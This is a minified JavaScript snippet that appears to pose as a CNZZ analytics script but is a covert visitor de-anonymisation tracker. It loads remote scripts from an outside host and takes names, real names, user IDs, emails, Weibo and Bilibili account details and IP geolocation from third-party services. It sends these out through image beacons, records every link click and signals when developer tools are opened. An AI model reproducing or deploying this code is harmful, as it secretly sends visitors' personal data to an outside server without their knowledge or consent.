cNz=function(W,D,L,E,U,T,_,q,Q,ic){var _a,P,B=D.body,C=function(a,b,c){return"undefined"==typeof b?(b=D.cookie.match(new RegExp("(^| )"+a+"=([^;]*)(;|$)")),null==b?null:unescape(b[2])):(c=new Date,c.setTime(c.getTime()+9e10),D.cookie=a+"="+escape(b)+";path=/;expires="+c.toGMTString(),void 0)},$=function(a,b,c){"object"==typeof a?b=a:(b={},a&&(b.t=a)),(c=L.hash.substr(1))&&(b.u=c),(c=H(D.referrer))&&(b.r=c),(new Image).src=_+"?"+u(b)},H=function(a){return a.replace(/^https?:\/\//,"")},j=function(i,d,f){with(d=D.createElement("script"))src=_+i,charset="UTF-8",onload=onerror=function(){B.removeChild(d)};B.appendChild(d)},O=function(a,b){for(b in a)return 1;return 0},u=function(a,b,c){if("object"==typeof a){b=[];for(c in a)"each"!=c&&b.push(c+q+E(a[c]));return b.join(Q)}if(!a)return a;for(a=a.split(Q),c=a.length,b={};c--;)b[(o=a[c].split(q))[0]]=U(o[1]||"");return b},J=function(a){a=a||"",$(a+D.title)};return $.w=function(a,b){a&&a.data&&a.data.name&&(b=a.data.name)&&!b.match(/^亲爱/)?$({w:b}):J("★"),C(ic,"bd")},$.bd=function(a){if(a&&a.ipLocation){if(a=a.ipLocation.content,!a.locid)return J("﹃");a=a.point,$({xy:[a.y,a.x]})}},W._bb=function(a){a&&a.uname?$({b:a.uname,bid:a.mid,bface:a.face,bsign:a.sign}):J("♂")},$.y=function(a){a&&a.nickname?$({y:a.nickname}):J("☯")},$.ty=function(a,b){b?$({ty:b}):J("♆")},$.p=function(a,b){b={},a&&a.realname&&(b.p=a.realname+"|"+a.uid),a.uname&&(b.m=a.uname),O(b)?$(b):J("✌")},$.d=function(a,b,c){a&&(a=a.visitor)&&(c={},a.name&&(c.d=a.name),a.email&&(c.m=a.email),a.url&&(c.s=H(a.url)),(a=a.social_uid)&&(a=a.weibo)&&(c.v=a),O(c)?$(c):j("w"))},$.j=function(a,b){for(b=a.length;b--;)j(a[b])},(_a=C(ic))&&(j(_a),C(ic,"")),P=function(){T(J,100)},W.addEventListener?W.addEventListener("hashchange",P,!1):W.attachEvent&&W.attachEvent("onhashchange",P),T(function(){j("i")},1e3),$}(window,document,location,encodeURIComponent,decodeURIComponent,setTimeout,"http://1.mouto.org/","=","&","_cnzz_cA137"),document.getElementsByTagName("html")[0].onclick=function(a){for(var b=a.target;b&&"A"!=b.tagName&&"BODY"!=b.tagName;)b=b.parentNode;b&&"A"==b.tagName&&cNz("A:"+b.getAttribute("href"))},function(a){console.log(a),a.toString=function(){return cNz("F12"),""}}(/./);